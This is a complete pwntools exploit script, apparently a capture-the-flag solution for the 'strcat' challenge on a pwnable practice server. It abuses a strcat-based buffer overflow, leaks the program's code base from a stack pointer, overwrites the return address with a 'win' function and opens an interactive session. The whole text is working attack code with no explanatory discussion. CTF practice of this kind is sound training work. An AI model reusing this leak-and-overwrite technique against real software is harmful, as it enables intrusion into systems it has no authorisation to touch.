###strcat BOF

from pwn import *

###Util
def reset():
    r.sendlineafter('> ','1')
    r.sendafter('data: ',b'a'*0x7f+b'\x00')

def edit(cnt,mode='leak',payload=None):
    r.sendlineafter('> ','2')
    L = int(r.recvuntil(' chars: ',drop=True).split(b' ')[-1])
    if L==0:
        return 0,cnt
    ###NULL terminate to make exploit more stable
    if mode=='leak':
        if L<14:
            r.send(b'a'*(L-1)+b'\x00')
            return 0,cnt+(L-1)
        else:
            r.send('a'*8)
            return 1,cnt+14
    else:
        if cnt+L<=0x408:
            r.send(b'a'*(L-1)+b'\x00')
            return 0,cnt+(L-1)
        else:
            offset = 0
            padding = b''
            if cnt>0x408:
                offset = cnt-0x408
            else:
                padding = b'a'*(0x408-cnt)
            if cnt+L>=0x40f:
                payload = payload[offset:]
            else:
                payload = payload[offset:cnt+L-0x408-1]
            r.send(padding+payload+b'\x00')
            return cnt+L>=0x40f,cnt+(L-1)

def show():
    r.sendlineafter('> ','3')
    return r.recvline()[14:-1]

def leave():
    r.sendlineafter('> ','0')

###Addr
ptr2code_offset = 0xbc2
win_offset = 0xb57

###Exploit
while True:
    try:
        r = remote('svc.pwnable.xyz',30014)
        ###Leak code base with value on stack(unstable(returns wrong value with very low probability) for unknown reason)
        cnt = 0
        while True:
            res,cnt = edit(cnt,mode='leak')
            if res==1:
                ptr2code_addr = u64(show()[-6:]+b'\x00\x00')
                code_base = ptr2code_addr-ptr2code_offset
                print(hex(code_base))
                break
        if code_base&0xfff!=0:
            exit()
        ###Just in case, unlikely to end up here
        if cnt>0x408:
            reset()
            cnt = 0x7f
        ###Overflow buffer to hijack return addr
        payload = p64(code_base+win_offset)[:-2]
        while True:
            res,cnt = edit(cnt,mode='hijack',payload=payload)
            print(hex(cnt))
            if res==1:
                break
        leave()
        r.interactive()
        break
    except:
        r.close()
